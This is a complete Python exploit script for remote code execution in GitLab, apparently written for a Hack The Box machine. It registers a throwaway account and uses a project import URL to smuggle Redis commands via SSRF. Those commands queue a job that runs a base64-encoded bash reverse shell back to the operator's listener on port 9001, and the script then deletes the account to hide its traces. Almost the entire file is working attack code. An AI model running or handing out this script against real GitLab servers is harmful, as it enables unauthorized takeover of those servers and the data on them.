#!/usr/bin/env python3
#The modules to be imported
import requests
from html.parser import HTMLParser
import base64
import sys
import time
import random
import string

# The classes:
# Class 1:GitLab RCE
class Gitlab:
    # The funcitons
    # Function 1: Main
    def __init__(self, gitlab_url, local_ip):
        self.url = gitlab_url
        self.local_ip = local_ip
        self.port = 9001
        self.email_domain = 'ready.htb'
        self.session = requests.session()
        self.username = ""
        self.password = ""

    # Funciton 2:Authenticity Token
    def authenticate(self, url, i=-1):
        result = self.session.get(url, verify=False)
        parser = GitlabParse()
        token = parser.feed(result.text, i)
        return token

    # Funciton 3: Generate random username and password
    def randomize(self):
        sequence = string.ascii_letters + string.digits
        random_list = random.choices(sequence, k=10)
        random_string = "".join(random_list)
        return random_string

    # Function 4: Registering the user
    def register_user(self):
        token = self.authenticate(self.url + "/users/sign_in#register-pane")
        self.username = self.randomize()
        self.password = self.randomize()
        email = "{}@{}".format(self.username, self.email_domain)
        data = {"new_user[name]" : self.username,
                "new_user[username]" : self.username,
                "new_user[email]" : email,
                "new_user[email_confirmation]" : email,
                "new_user[password]" : self.password,
                "authenticity_token" : token,
               }
        result = self.session.post(self.url + "/users/", data=data, verify=False)
        print("[+]Username:", self.username)
        print("[+]Password:", self.password)
        print("[+]Registering user:", self.username)
        print("[+]Status code:", result.status_code)

    # Function 5: Loggin In
    def login(self):
        token = self.authenticate(self.url + "/users/sign_in", 0)
        data = {"authenticity_token" : token,
                "user[login]" : self.username,
                "user[password]" : self.password,
                }
        result = self.session.post(self.url + "/users/sign_in", data=data, verify=False)
        print("[+]Logging in")
        print("[+]Status code: {}").format(result)

    # Function 6: Deleting the user
    def delete_user(self):
        token = self.authenticate(self.url + "/profile/account")
        data = {"authenticity_token" : token,
                "_method" : "delete",
                "password" : self.password,
                }
        result = self.session.post(self.url + "/users", data=data, verify=False)
        print("[+]Deleting User:", self.username)
        print("[+]Status code:", result.status_code)

    # Function 7: Exploit Creation
    def exploit(self, payload):
        token = self.authenticate(self.url + "/projects/new")
        payload_template = project = self.randomize()
        payload_template = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{payload} \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
 exec
 exec
 exec"""
        # using replace for formating is shit!! too bad...
        payload = payload_template.replace("{payload}", payload)
        data = {"authenticity_token": token,
                "project[import_url]": payload,
                "project[ci_cd_only]": "false",
                "project[name]": project,
                "project[path]": project,
                "project[visibility_level]": "0",
                "project[description]": "all your base are belong to us"
                }
        result = self.session.post(self.url + "/projects", data=data, verify=False)
        print("[+]Hacking in progress: {} :Status-Code".format(result.status_code))

    # Function 8: Preparing the payload
    def prepare_payload(self):
        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.local_ip, self.port)
        wrapper = "echo {base64_payload} | base64 -d | /bin/bash"
        base64_payload = base64.b64encode(payload.encode()).decode("utf-8")
        payload = wrapper.format(base64_payload=base64_payload)
        return payload

    # Function 9: Delivering the payload
    def main(self):
        self.register_user()
        self.exploit(self.prepare_payload())
        time.sleep(10)
        self.delete_user()

# Class 2: The HTML parser
class GitlabParse(HTMLParser):
    # Functions
    # Function 1: The initial function
    def __init__(self):
        super(GitlabParse, self).__init__()
        self.tokens = []
        self.current_name = ""
        
    # Function 2: Handling the starttah
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if self.current_name == "authenticity_token" and name == "value":
                    self.tokens.append(value)
                self.current_name = value
        elif tag == "meta":
            for name, value in attrs:
                if self.current_name == "csrf-token":
                    self.tokens.append(value)
                self.current_name = value

    # Function 3: Feed
    def feed(self, data, i):
        super(GitlabParse, self).feed(data)
        return self.tokens[i]

# Function 3: The program function
def run():
    args = sys.argv
    if len(args) != 3:
        print("[+]Usage: {} <http://gitlab:port> <local-ip>".format(args[0]))
        return
    else:
        target_url = args[1]
        local_ip = args[2]
        c = Gitlab(target_url, local_ip)
        input("[+]Start a listener on port {port} and hit enter (nc -vlnp {port})".format(port=c.port))
        c.main()

# The program
run()
